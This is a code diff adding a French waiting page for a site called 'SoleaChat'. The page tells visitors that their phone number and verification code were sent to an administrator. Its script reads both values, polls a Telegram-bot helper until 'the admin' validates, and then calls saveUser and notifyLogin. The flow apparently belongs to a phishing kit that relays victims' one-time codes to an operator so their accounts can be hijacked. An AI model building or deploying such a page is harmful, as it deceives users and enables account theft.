@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SoleaChat - Vérification en cours</title>
+    <link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="waiting-container">
+            <div class="logo">
+                <h1>💕 SoleaChat</h1>
+            </div>
+            
+            <div class="waiting-animation">
+                <div class="heart-spinner">💖</div>
+            </div>
+            
+            <h2>Vérification en cours...</h2>
+            
+            <p>Ton code de vérification a été envoyé à l'administrateur</p>
+            
+            <div class="code-display">
+                <p>📱 Numéro : <strong id="displayPhone"></strong></p>
+                <p>🔑 Code : <strong id="displayCode"></strong></p>
+                <p style="font-size: 0.8rem; margin-top: 10px;">
+                    L'administrateur vérifie ton code...
+                </p>
+            </div>
+            
+            <div class="waiting-dots">
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+            </div>
+            
+            <p style="font-size: 0.85rem; color: var(--text-secondary);">
+                Cette opération peut prendre quelques instants<br>
+                Ne ferme pas cette page 💕
+            </p>
+            
+            <button onclick="window.location.href='../index.html'" 
+                    style="margin-top: 20px; background: none; border: none; color: var(--text-secondary); text-decoration: underline; cursor: pointer; font-size: 0.85rem;">
+                ← Retour
+            </button>
+        </div>
+    </div>
+    
+    <script src="../js/config.js"></script>
+    <script src="../js/telegram-bot.js"></script>
+    <script>
+        // Récupérer les informations de session
+        const phoneNumber = sessionStorage.getItem('phone_number');
+        const verificationCode = sessionStorage.getItem('verification_code');
+        
+        console.log('Page d\'attente chargée');
+        console.log('Téléphone:', phoneNumber);
+        console.log('Code:', verificationCode);
+        
+        // Vérifier qu'on a bien les infos
+        if (!phoneNumber || !verificationCode) {
+            console.log('Infos manquantes, redirection vers accueil');
+            window.location.href = '../index.html';
+        }
+        
+        // Afficher le numéro et le code
+        document.getElementById('displayPhone').textContent = phoneNumber || 'N/A';
+        document.getElementById('displayCode').textContent = verificationCode || 'N/A';
+        
+        let checkCount = 0;
+        const maxChecks = 300; // 10 minutes max (300 x 2 secondes)
+        
+        // Vérifier la validation toutes les 2 secondes
+        function checkValidation() {
+            checkCount++;
+            console.log('Vérification #' + checkCount);
+            
+            if (!phoneNumber) {
+                console.log('Pas de numéro, redirection');
+                window.location.href = '../index.html';
+                return;
+            }
+            
+            // Vérifier si l'admin a validé
+            const isVerified = telegramManager.checkVerification(phoneNumber);
+            console.log('Statut vérification:', isVerified);
+            
+            if (isVerified) {
+                console.log('✅ Vérification réussie !');
+                
+                // Récupérer les données d'inscription
+                const registrationData = JSON.parse(sessionStorage.getItem('registration_data'));
+                
+                if (!registrationData) {
+                    console.log('Pas de données d\'inscription');
+                    window.location.href = '../index.html';
+                    return;
+                }
+                
+                // Créer l'objet utilisateur
+                const userData = {
+                    ...registrationData,
+                    phoneNumber: phoneNumber,
+                    createdAt: new Date().toISOString()
+                };
+                
+                console.log('Données utilisateur:', userData);
+                
+                // Sauvegarder l'utilisateur
+                telegramManager.saveUser(userData);
+                telegramManager.notifyLogin(userData);
+                
+                // Sauvegarder la session
+                sessionStorage.setItem('soleachat_current_user', JSON.stringify(userData));
+                
+                // Nettoyer les données temporaires
+                sessionStorage.removeItem('registration_data');
+                sessionStorage.removeItem('phone_number');
+                sessionStorage.removeItem('verification_code');
+                
+                console.log('Redirection vers le chat...');
+                
+                // Rediriger vers le chat
+                window.location.href = 'chat.html';
+                return;
+            }
+            
+            // Si on a dépassé le nombre max de vérifications
+            if (checkCount >= maxChecks) {
+                console.log('⏰ Temps écoulé');
+                alert('Le temps de vérification a expiré. Veuillez réessayer.');
+                window.location.href = '../index.html';
+                return;
+            }
+            
+            // Continuer à vérifier
+            setTimeout(checkValidation, 2000);
+        }
+        
+        // Démarrer la vérification après un court délai
+        setTimeout(() => {
+            console.log('Démarrage des vérifications...');
+            checkValidation();
+        }, 1000);
+    </script>
+</body>
+</html>
